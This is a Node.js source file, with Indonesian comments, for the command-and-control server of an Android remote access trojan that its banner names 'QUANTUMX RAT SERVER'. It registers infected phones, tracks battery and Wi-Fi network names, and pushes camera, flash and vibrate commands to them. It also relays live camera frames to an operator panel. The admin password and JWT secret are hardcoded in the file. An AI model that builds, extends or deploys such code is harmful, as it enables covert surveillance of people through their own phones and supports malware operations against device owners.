const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const jwt = require('jsonwebtoken');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    maxHttpBufferSize: 1e8 // 100MB untuk gambar
});

// Middleware
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// ========== DATABASE ==========
let users = [
    {
        id: 1,
        username: 'admin',
        password: 'quantumx',
        role: 'admin'
    }
];

let devices = new Map();
let commands = new Map();
let commandResults = new Map();

// Camera sessions tracking
let cameraSessions = new Map(); // deviceId -> { active: boolean, socketId: string }

// ========== AUTH ==========
const JWT_SECRET = 'quantumx-super-secret-key-2024';

function authenticateToken(req, res, next) {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    
    if (!token) return res.status(401).json({ error: 'No token provided' });
    
    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) return res.status(403).json({ error: 'Invalid token' });
        req.user = user;
        next();
    });
}

// ========== API ROUTES ==========

// Login
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    const user = users.find(u => u.username === username);
    
    if (user && password === 'quantumx') {
        const token = jwt.sign(
            { id: user.id, username: user.username, role: user.role },
            JWT_SECRET,
            { expiresIn: '24h' }
        );
        
        console.log(`✅ [LOGIN] ${username} - SUCCESS`);
        res.json({ success: true, token, user });
    } else {
        console.log(`❌ [LOGIN] ${username} - FAILED`);
        res.status(401).json({ success: false, error: 'Invalid credentials' });
    }
});

// Verify token
app.post('/api/verify', authenticateToken, (req, res) => {
    res.json({ success: true, user: req.user });
});

// Device register
app.post('/api/device/register', (req, res) => {
    const { deviceId, deviceName, androidVersion, manufacturer, model, batteryLevel, networkType, networkName } = req.body;
    
    const deviceInfo = {
        deviceId,
        deviceName: deviceName || 'Unknown Device',
        androidVersion: androidVersion || 'Unknown',
        manufacturer: manufacturer || 'Unknown',
        model: model || 'Unknown',
        batteryLevel: batteryLevel || 0,
        networkType: networkType || 'Unknown',
        networkName: networkName || '',
        lastSeen: new Date().toISOString(),
        online: true,
        ipAddress: req.ip || req.connection.remoteAddress,
        registeredAt: new Date().toISOString()
    };
    
    devices.set(deviceId, deviceInfo);
    
    console.log(`✅ [REGISTER] ${deviceName} (${deviceId}) - ANDROID: ${androidVersion} - BATTERY: ${batteryLevel}% - NETWORK: ${networkType} ${networkName}`);
    
    res.json({ success: true, deviceId, message: 'Device registered' });
});

// Get all devices
app.get('/api/devices', authenticateToken, (req, res) => {
    const deviceList = Array.from(devices.values());
    const now = new Date();
    
    deviceList.forEach(device => {
        const lastSeen = new Date(device.lastSeen);
        const diffMinutes = (now - lastSeen) / (1000 * 60);
        device.online = diffMinutes < 2;
    });
    
    res.json(deviceList);
});

// Send command
app.post('/api/device/:deviceId/command', authenticateToken, (req, res) => {
    const deviceId = req.params.deviceId;
    const { command, params } = req.body;
    
    const commandId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
    
    if (!commands.has(deviceId)) commands.set(deviceId, []);
    
    const commandData = {
        commandId,
        command,
        params: params || {},
        status: 'pending',
        createdAt: new Date().toISOString(),
        createdBy: req.user.username
    };
    
    commands.get(deviceId).push(commandData);
    
    // Emit ke device
    io.to(deviceId).emit('command', commandData);
    
    const deviceName = devices.get(deviceId)?.deviceName || deviceId;
    
    // LOG PERTAMA: PROSES
    if (command === 'flash') {
        console.log(`📸 [FLASH] SENDING -> ${deviceName} (${deviceId}) | DURATION: ${params?.duration || 2}s`);
    } else if (command === 'camera') {
        console.log(`📷 [CAMERA] CAPTURING -> ${deviceName} (${deviceId})`);
    } else if (command === 'vibrate') {
        console.log(`📳 [VIBRATE] SENDING -> ${deviceName} (${deviceId}) | DURATION: ${params?.duration || 2}s`);
    }
    
    res.json({ success: true, commandId, message: 'Command sent' });
});

// Command result
app.post('/api/device/command/result', (req, res) => {
    const { commandId, deviceId, status, result } = req.body;
    
    const deviceCommands = commands.get(deviceId) || [];
    const commandIndex = deviceCommands.findIndex(cmd => cmd.commandId === commandId);
    
    if (commandIndex !== -1) {
        deviceCommands[commandIndex].status = status || 'completed';
        deviceCommands[commandIndex].result = result;
        deviceCommands[commandIndex].completedAt = new Date().toISOString();
        commands.set(deviceId, deviceCommands);
        
        commandResults.set(commandId, {
            deviceId,
            command: deviceCommands[commandIndex].command,
            status,
            result,
            completedAt: new Date().toISOString()
        });
        
        io.emit('command-result', { commandId, deviceId, status, result, command: deviceCommands[commandIndex].command });
        
        const deviceName = devices.get(deviceId)?.deviceName || deviceId;
        
        // LOG KEDUA: HASIL
        if (deviceCommands[commandIndex].command === 'flash') {
            if (status === 'completed') {
                console.log(`✅ [FLASH] SUCCESS -> ${deviceName} | DURATION: ${result?.duration}s`);
            } else {
                console.log(`❌ [FLASH] FAILED -> ${deviceName}`);
            }
        } else if (deviceCommands[commandIndex].command === 'camera') {
            if (status === 'completed') {
                console.log(`✅ [CAMERA] SUCCESS -> ${deviceName} | PHOTO TAKEN`);
            } else {
                console.log(`❌ [CAMERA] FAILED -> ${deviceName}`);
            }
        } else if (deviceCommands[commandIndex].command === 'vibrate') {
            if (status === 'completed') {
                console.log(`✅ [VIBRATE] SUCCESS -> ${deviceName} | DURATION: ${result?.duration}s`);
            } else {
                console.log(`❌ [VIBRATE] FAILED -> ${deviceName}`);
            }
        }
    }
    
    res.json({ success: true });
});

// ========== WEBSOCKET ==========
io.on('connection', (socket) => {
    console.log(`🔌 [SOCKET] CONNECTED: ${socket.id}`);
    
    // ===== DEVICE CONNECT (DARI APK) =====
    socket.on('device-connect', (data) => {
        const { 
            deviceId, 
            deviceName, 
            androidVersion, 
            manufacturer, 
            model, 
            batteryLevel,
            networkType,
            networkName
        } = data;
        
        socket.deviceId = deviceId;
        socket.deviceType = 'device';
        socket.join(deviceId);
        
        // Update atau simpan device dengan DATA LENGKAP
        if (devices.has(deviceId)) {
            const device = devices.get(deviceId);
            device.online = true;
            device.lastSeen = new Date().toISOString();
            device.deviceName = deviceName || device.deviceName;
            device.androidVersion = androidVersion || device.androidVersion;
            device.manufacturer = manufacturer || device.manufacturer;
            device.model = model || device.model;
            device.batteryLevel = batteryLevel || device.batteryLevel;
            device.networkType = networkType || device.networkType || 'Unknown';
            device.networkName = networkName || device.networkName || '';
            devices.set(deviceId, device);
        } else {
            const deviceInfo = {
                deviceId,
                deviceName: deviceName || 'Unknown Device',
                androidVersion: androidVersion || 'Unknown',
                manufacturer: manufacturer || 'Unknown',
                model: model || 'Unknown',
                batteryLevel: batteryLevel || 0,
                networkType: networkType || 'Unknown',
                networkName: networkName || '',
                lastSeen: new Date().toISOString(),
                online: true,
                registeredAt: new Date().toISOString()
            };
            devices.set(deviceId, deviceInfo);
        }
        
        console.log(`📱 [DEVICE] ONLINE: ${deviceName} (${deviceId}) - ANDROID: ${androidVersion} - BATTERY: ${batteryLevel}% - NETWORK: ${networkType} ${networkName}`);
        
        // KIRIM DATA LENGKAP KE PANEL!
        io.emit('device-status', {
            deviceId,
            deviceName,
            androidVersion,
            manufacturer,
            model,
            batteryLevel,
            networkType,
            networkName,
            status: 'online',
            timestamp: new Date().toISOString()
        });
    });
    
    // ===== HEARTBEAT DARI APK =====
    socket.on('heartbeat', (data) => {
        const { deviceId, batteryLevel, deviceName, androidVersion, networkType, networkName } = data;
        
        if (devices.has(deviceId)) {
            const device = devices.get(deviceId);
            device.lastSeen = new Date().toISOString();
            device.online = true;
            device.batteryLevel = batteryLevel || device.batteryLevel;
            device.deviceName = deviceName || device.deviceName;
            device.androidVersion = androidVersion || device.androidVersion;
            device.networkType = networkType || device.networkType || 'Unknown';
            device.networkName = networkName || device.networkName || '';
            devices.set(deviceId, device);
        }
        
        // KIRIM HEARTBEAT KE PANEL (UPDATE DATA)
        io.emit('heartbeat', {
            deviceId,
            batteryLevel,
            deviceName,
            androidVersion,
            networkType,
            networkName,
            timestamp: new Date().toISOString()
        });
        
        // Log heartbeat (1% chance)
        if (Math.random() < 0.01) {
            console.log(`💓 [HEARTBEAT] ${deviceName} (${deviceId}) - BATTERY: ${batteryLevel}% - NETWORK: ${networkType} ${networkName}`);
        }
    });
    
    // ===== CAMERA FRAME DARI APK =====
    socket.on('camera-frame', (data) => {
        const { deviceId, imageData, timestamp } = data;
        
        // Validasi device
        if (!deviceId) return;
        
        // Update last seen device
        if (devices.has(deviceId)) {
            const device = devices.get(deviceId);
            device.lastSeen = new Date().toISOString();
            devices.set(deviceId, device);
        }
        
        // Kirim frame ke semua panel
        io.emit('camera-frame', {
            deviceId,
            imageData,
            timestamp: timestamp || Date.now()
        });
    });
    
    // ===== PANEL CONNECT =====
    socket.on('panel-connect', () => {
        socket.isPanel = true;
        socket.deviceType = 'panel';
        console.log(`🖥️ [PANEL] CONNECTED: ${socket.id}`);
    });
    
    // ===== DISCONNECT =====
    socket.on('disconnect', () => {
        if (socket.deviceId) {
            const deviceId = socket.deviceId;
            
            if (devices.has(deviceId)) {
                const device = devices.get(deviceId);
                device.online = false;
                devices.set(deviceId, device);
                
                // Hapus camera session jika ada
                if (cameraSessions.has(deviceId)) {
                    cameraSessions.delete(deviceId);
                }
            }
            
            const deviceName = devices.get(deviceId)?.deviceName || deviceId;
            console.log(`📱 [DEVICE] OFFLINE: ${deviceName} (${deviceId})`);
            
            io.emit('device-status', {
                deviceId,
                status: 'offline',
                timestamp: new Date().toISOString()
            });
        } else {
            console.log(`🔌 [SOCKET] DISCONNECTED: ${socket.id}`);
        }
    });
});

// ========== STATS ==========
app.get('/api/stats', authenticateToken, (req, res) => {
    const deviceList = Array.from(devices.values());
    const now = new Date();
    
    let onlineCount = 0;
    deviceList.forEach(device => {
        const lastSeen = new Date(device.lastSeen);
        const diffMinutes = (now - lastSeen) / (1000 * 60);
        if (diffMinutes < 2) onlineCount++;
    });
    
    res.json({
        totalDevices: devices.size,
        onlineDevices: onlineCount,
        totalCommands: commandResults.size,
        pendingCommands: Array.from(commands.values()).flat().filter(c => c.status === 'pending').length,
        activeCameras: cameraSessions.size
    });
});

// ========== START ==========
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`
╔═══════════════════════════════════════════════════╗
║    QUANTUMX RAT SERVER v3.3                       ║
║    RUNNING ON PORT: ${PORT}                                    ║
║    WEBSOCKET: ws://localhost:${PORT}                           ║
║    API: http://localhost:${PORT}/api                          ║
║                                                     ║
║    LOG FORMAT:                                       ║
║    📸 [FLASH] SENDING -> Device (2s)                ║
║    ✅ [FLASH] SUCCESS -> Device | DURATION: 2s      ║
║    📳 [VIBRATE] SENDING -> Device (2s)              ║
║    ✅ [VIBRATE] SUCCESS -> Device | DURATION: 2s    ║
║    📷 [CAMERA] CAPTURING -> Device                   ║
║    ✅ [CAMERA] SUCCESS -> Device | PHOTO TAKEN       ║
║    📱 [DEVICE] ONLINE -> Device | NETWORK: WiFi SSID ║
║    💓 [HEARTBEAT] Device - 82% - NETWORK: 4G        ║
╚═══════════════════════════════════════════════════╝
    `);
});
